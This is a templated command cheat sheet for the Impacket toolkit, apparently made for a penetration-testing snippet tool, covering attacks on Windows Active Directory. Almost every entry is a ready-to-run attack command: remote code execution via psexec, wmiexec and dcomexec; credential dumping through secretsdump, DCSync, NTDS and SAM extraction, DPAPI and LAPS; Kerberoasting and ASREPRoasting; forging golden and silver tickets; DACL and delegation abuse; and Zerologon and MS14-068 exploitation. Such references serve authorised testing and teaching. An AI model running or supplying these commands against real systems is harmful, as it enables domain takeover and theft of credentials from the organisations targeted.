# Impacket

<!-- cheat
export impacket_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_target := $domain/'$user'@$rhost_ip
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_target := $domain/'$user':'$credential'@$rhost_ip
var auth_flags := ''
fi

if $auth_method == kerberos
var auth_target := $domain
var auth_flags := -k -no-pass
fi
-->

<!-- cheat
export impacket_domain_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_target := $domain/'$user'
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_target := $domain/'$user':'$credential'
var auth_flags := ''
fi

if $auth_method == kerberos
var auth_target := $domain/'$user'
var auth_flags := -k -no-pass
fi
-->

## Impacket psexec

### psexec

Spawn psexec with Impacket.

```sh title:"Impacket Spawn Psexec"
psexec.py $auth_target $auth_flags -service-name $service_name $ps_exec_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var service_name
-->

## Impacket smbexec

### smbexec

Spawn smbexec with Impacket.

```sh title:"Impacket Spawn Smbexec"
smbexec.py $auth_target $auth_flags -service-name $service_name
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var service_name
-->

## Impacket atexec

### atexec

Execute atexec with Impacket.

```sh title:"Impacket Execute Atexec"
atexec.py $auth_target $auth_flags $commands_template
```
<!-- cheat
import domain_ip
import users
import templates
import impacket_auth
-->

## Impacket wmiexec

### wmiexec

Spawn wmiexec with Impacket.

```sh title:"Impacket Spawn Wmiexec"
wmiexec.py $auth_target $auth_flags $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
-->

## Impacket dcomexec

### dcomexec

Spawn dcomexec with Impacket.

```sh title:"Impacket Spawn Dcomexec"
dcomexec.py $auth_target $auth_flags -object $dcom_object $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
-->

### dcomexec no output

Execute dcomexec no output with Impacket.

```sh title:"Impacket Execute Dcomexec No Output"
dcomexec.py $auth_target $auth_flags -object $dcom_object -silentcommand -nooutput $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
-->

## Impacket secretsdump

### secretsdump

Dump secretsdump with Impacket.

```sh title:"Impacket Dump Secretsdump"
secretsdump.py $auth_target $auth_flags $secrets_dump_templates
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
-->

### dpapi backup key

Dump DPAPI backup key with Impacket.

```sh title:"Impacket Dump DPAPI Backup Key"
dpapi.py backupkeys -t $auth_target $auth_flags -export
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### dpapi masterkey with backup key

Dump DPAPI masterkey with backup key with Impacket.

```sh title:"Impacket Dump DPAPI Masterkey with Backup Key"
dpapi.py masterkey -file $masterkey_file -pvk $backup_key_pvk
```
<!-- cheat
var masterkey_file
var backup_key_pvk
-->

### dpapi credential blob

Dump DPAPI credential blob with Impacket.

```sh title:"Impacket Dump DPAPI Credential Blob"
dpapi.py credential -file $credential_file -key $masterkey
```
<!-- cheat
var credential_file
var masterkey
-->

### regsecrets

Dump regsecrets with Impacket.

```sh title:"Impacket Dump Regsecrets"
regsecrets.py $auth_target $auth_flags -outputfile $output_prefix
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->

## Impacket getTGT

### getTGT

Run getTGT with Impacket.

```sh title:"Impacket Run GetTGT"
getTGT.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## Impacket smbclient

### smbclient

Run smbclient with Impacket.

```sh title:"Impacket Run Smbclient"
smbclient.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## Impacket mssqlclient

### mssqlclient

Run mssqlclient with Impacket.

```sh title:"Impacket Run Mssqlclient"
mssqlclient.py -windows-auth $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## Impacket ticketConverter

### kirbi to ccache

Convert kirbi to ccache with Impacket.

```sh title:"Impacket Convert Kirbi to Ccache"
ticketConverter.py $file ticket.ccache; export KRB5CCNAME=ticket.ccache
```
<!-- cheat
import files
-->

## Impacket ticketer ( request tickets)

### Forge silver ticket

Dump forge silver ticket with Impacket.

```sh title:"Impacket Dump Forge Silver Ticket"
ticketer.py -nthash $nthash -domain-sid $domain_sid -domain $domain -spn '$spn/$rhost_name:$group_id' $name
```
<!-- cheat
import domain_ip
import users
var nthash
var spn
var rhost_name
var group_id
var name
var domain_sid
-->

## Impacket describeTicket

### Ticket session key

Read ticket session key with Impacket.

```sh title:"Impacket Read Ticket Session Key"
describeTicket.py $ccache_file | grep 'Ticket Session Key'
```
<!-- cheat
var ccache_file
-->

## Impacket changePassword

### Set NT hash to session key

Set NT hash to session key with Impacket.

```sh title:"Impacket Set NT Hash to Session Key"
changepasswd.py -newhashes :$TGTSessionKey $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var TGTSessionKey
-->

### SMB server anonymous

Dump SMB server anonymous with Impacket.

```sh title:"Impacket Dump SMB Server Anonymous"
smbserver.py share $(pwd) -smb2support
```

### SMB server with creds

Dump SMB server with creds with Impacket.

```sh title:"Impacket Dump SMB Server with Creds"
smbserver.py share $(pwd) -smb2support -user $user -password $pass
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### RaiseChild parent escalation

Dump RaiseChild parent escalation with Impacket.

```sh title:"Impacket Dump RaiseChild Parent Escalation"
raiseChild.py -target-exec $rhost_ip $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

### Domain SID lookup

Dump domain SID lookup with Impacket.

```sh title:"Impacket Dump Domain SID Lookup"
lookupsid.py $auth_target $auth_flags | grep "Domain SID"
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### Forge golden ticket

Dump forge golden ticket with Impacket.

```sh title:"Impacket Dump Forge Golden Ticket"
ticketer.py -nthash $nthash -domain $domain -domain-sid $domain_sid -extra-sid $extra_sid-519 fakeuser
```
<!-- cheat
import domain_ip
import users
var nthash
var extra_sid
var domain_sid
-->

## GetUserSPNs

### Roast all SPNs

Enable roast all SPNs with Impacket.

```sh title:"Impacket Enable Roast All SPNs"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

### Targeted Kerberoast

Run targeted kerberoast with Impacket.

```sh title:"Impacket Run Targeted Kerberoast"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_user
-->

### Targeted Kerberoast to file

Dump targeted kerberoast to file with Impacket.

```sh title:"Impacket Dump Targeted Kerberoast to File"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user -outputfile $target_user.hash
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_user
-->

### Cross-domain SPN list

List cross domain SPN list with Impacket.

```sh title:"Impacket List Cross Domain SPN List"
GetUserSPNs.py -target-domain $alt_domain $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var alt_domain
-->

### Cross-domain Kerberoast

Run cross domain kerberoast with Impacket.

```sh title:"Impacket Run Cross Domain Kerberoast"
GetUserSPNs.py -request -target-domain $alt_domain $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var alt_domain
-->

### Pre-auth-less Kerberoast

List pre auth less kerberoast with Impacket.

```sh title:"Impacket List Pre Auth Less Kerberoast"
GetUserSPNs.py -no-preauth $user -usersfile users.txt  -dc-host $rhost_name.$domain $domain/
```
<!-- cheat
var user
var rhost_name
var domain
-->

## GetNPUsers (ASREPRoast)

### Unauthenticated ASREPRoast

Read unauthenticated ASREPRoast with Impacket.

```sh title:"Impacket Read Unauthenticated ASREPRoast"
GetNPUsers.py -dc-ip $rhost_ip $domain/ -usersfile $users_file -format hashcat -outputfile asreproast.out
```
<!-- cheat
import domain_ip
var users_file
var domain
-->

### Authenticated ASREPRoast

Read authenticated ASREPRoast with Impacket.

```sh title:"Impacket Read Authenticated ASREPRoast"
GetNPUsers.py -dc-ip $rhost_ip $auth_target $auth_flags -request -format hashcat -outputfile asreproast.out
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## getST (S4U / silver ticket impersonate)

### S4U2Self+S4U2Proxy impersonate

Enumerate S4U2Self+S4U2Proxy impersonate with Impacket.

```sh title:"Impacket Enumerate S4U2Self+S4U2Proxy Impersonate"
getST.py -spn cifs/$rhost_name $auth_target $auth_flags -impersonate $target_user
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var rhost_name
var target_user
-->

## goldenPac (MS14-068)

### goldenPac PAC forgery

Execute goldenPac PAC forgery with Impacket.

```sh title:"Impacket Execute GoldenPac PAC Forgery"
goldenPac.py -dc-ip $rhost_ip $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## GetADUsers

### List domain users

List domain users with Impacket.

```sh title:"Impacket List Domain Users"
GetADUsers.py -all $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## GetADComputers

### List domain computers

List domain computers with Impacket.

```sh title:"Impacket List Domain Computers"
GetADComputers.py $auth_target $auth_flags -dc-ip $rhost_ip -resolveIP
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## addcomputer

### Add machine account

Add machine account with Impacket.

```sh title:"Impacket Add Machine Account"
addcomputer.py $auth_target $auth_flags -dc-ip $rhost_ip -computer-name "$computer_name$" -computer-pass $computer_pass
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var computer_name
var computer_pass
-->

## dacledit

### Read target DACL

Read target DACL with Impacket.

```sh title:"Impacket Read Target DACL"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -target $target_object -action read
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_object
-->

### Grant FullControl

Run grant FullControl with Impacket.

```sh title:"Impacket Run Grant FullControl"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target $target_object -action write -rights FullControl
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var target_object
-->

### Grant DCSync

Run grant DCSync with Impacket.

```sh title:"Impacket Run Grant DCSync"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target-dn $domain_dn -action write -rights DCSync
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var domain_dn
-->

## owneredit

### Change object owner

Set change object owner with Impacket.

```sh title:"Impacket Set Change Object Owner"
owneredit.py $auth_target $auth_flags -dc-ip $rhost_ip -new-owner $controlled_object -target $target_object -action write
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var target_object
-->

## rbcd

### Read RBCD

Read RBCD with Impacket.

```sh title:"Impacket Read RBCD"
rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-to "$target_computer$" -action read
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_computer
-->

### Write RBCD

Write RBCD with Impacket.

```sh title:"Impacket Write RBCD"
rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-from "$controlled_computer$" -delegate-to "$target_computer$" -action write
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_computer
var target_computer
-->

## findDelegation

### Enumerate delegation

Enumerate delegation with Impacket.

```sh title:"Impacket Enumerate Delegation"
findDelegation.py $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## ldap_shell

### Interactive LDAP shell

Spawn interactive LDAP shell with Impacket.

```sh title:"Impacket Spawn Interactive LDAP Shell"
ldap_shell.py $auth_target@$rhost_ip $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## machineAccountQuota

### Check MachineAccountQuota

Check MachineAccountQuota with Impacket.

```sh title:"Impacket Check MachineAccountQuota"
machineAccountQuota.py $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## GetLAPSPassword

### Dump readable LAPS passwords

Dump readable LAPS passwords with Impacket.

```sh title:"Impacket Dump Readable LAPS Passwords"
GetLAPSPassword.py $auth_target $auth_flags -dc-ip $rhost_ip -outputfile $output_file
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var output_file
-->

## Impacket recon misc

### reg.py remote query

Enumerate reg.py remote query with Impacket.

```sh title:"Impacket Enumerate Reg.py Remote Query"
reg.py $auth_target $auth_flags query -keyName $reg_key -s
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var reg_key
-->

### rpcdump endpoints

Dump rpcdump endpoints with Impacket.

```sh title:"Impacket Dump Rpcdump Endpoints"
rpcdump.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### services management

Enumerate services management with Impacket.

```sh title:"Impacket Enumerate Services Management"
services.py $auth_target $auth_flags $action
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var action = printf '%s\n' 'list' 'status' 'config' 'start' 'stop' 'delete' 'create' 'change' --- --header 'Service action'
-->

### getArch

Probe getArch with Impacket.

```sh title:"Impacket Probe GetArch"
getArch.py -target $rhost_ip
```
<!-- cheat
import domain_ip
-->

### netview enumeration

List netview enumeration with Impacket.

```sh title:"Impacket List Netview Enumeration"
netview.py $auth_target $auth_flags -target $rhost_ip -users $users_file
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var users_file
-->

### samrdump SAM info

Dump samrdump SAM info with Impacket.

```sh title:"Impacket Dump Samrdump SAM Info"
samrdump.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### DumpNTLMInfo

Read DumpNTLMInfo with Impacket.

```sh title:"Impacket Read DumpNTLMInfo"
DumpNTLMInfo.py $rhost_ip
```
<!-- cheat
import domain_ip
-->

### Check LDAP relay status

Check LDAP relay status with Impacket.

```sh title:"Impacket Check LDAP Relay Status"
CheckLDAPStatus.py -dc-ip $rhost_ip -domain $domain
```
<!-- cheat
import domain_ip
var domain
-->

## Impacket secretsdump (offline / variants)

### Local SAM offline

Dump local SAM offline with Impacket.

```sh title:"Impacket Dump Local SAM Offline"
secretsdump.py -system $system_hive -sam $sam_hive LOCAL
```
<!-- cheat
var system_hive
var sam_hive
-->

### Local NTDS offline

Dump local NTDS offline with Impacket.

```sh title:"Impacket Dump Local NTDS Offline"
secretsdump.py -ntds $ntds_file -system $system_hive LOCAL -outputfile $output_prefix
```
<!-- cheat
var ntds_file
var system_hive
var output_prefix
-->

### Zerologon anonymous DCSync

Dump zerologon anonymous DCSync with Impacket.

```sh title:"Impacket Dump Zerologon Anonymous DCSync"
secretsdump.py $domain/$dc_netbios\$@$rhost_ip -no-pass -just-dc-user Administrator
```
<!-- cheat
import domain_ip
var domain
var dc_netbios
-->

### Just DC NTLM hashes

Dump just DC NTLM hashes with Impacket.

```sh title:"Impacket Dump Just DC NTLM Hashes"
secretsdump.py -just-dc-ntlm -outputfile $output_prefix $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->

### DCSync with metadata

Dump DCSync with metadata with Impacket.

```sh title:"Impacket Dump DCSync with Metadata"
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile $output_prefix $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->
